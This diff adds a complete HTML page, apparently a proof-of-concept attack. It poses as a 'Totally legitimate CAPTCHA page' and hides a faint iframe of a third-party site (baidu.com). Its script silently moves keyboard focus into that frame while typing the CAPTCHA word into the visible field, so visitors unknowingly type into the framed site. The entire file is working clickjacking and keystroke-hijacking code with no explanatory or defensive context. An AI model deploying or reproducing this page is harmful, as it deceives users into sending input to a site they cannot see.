@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+</head>
+<body onload="document.getElementById('dummy').focus()">
+    <h3>Totally legitimate CAPTCHA page</h3>
+    <iframe src="http://www.baidu.com/" id=victim name=victim style="opacity: 0.2" height="20%" width="80%">
+    </iframe>
+    <script>
+        var cur_pos = 0;
+        var value = "opportunity";
+        function maybe_redirect(e) {
+            if (window.netscape == undefined) {
+                document.getElementById('victim').focus();
+            } else {
+                var frame = window.frames['victim'];
+                frame.focus();
+                frame.contentDocument.body.focus();
+            }
+            setTimeout(auto, 10);
+        }
+        function auto() {
+            if (cur_pos < value.length) {
+                document.getElementById('dummy').value += value.charAt(cur_pos++);
+                setTimeout(auto, 200);
+            }
+        }
+    </script>
+    <p>
+        <span style="border: 1px solid red; background-color: #FFFFC0; font-size: 20pt; padding: 5px">opportunity</span>
+    <p>
+    Retype text from the image to authenticate, then hit RETURN:<br>
+    <input type=text onkeydown="maybe_redirect(event)" id=dummy>
+</body>
+</html>
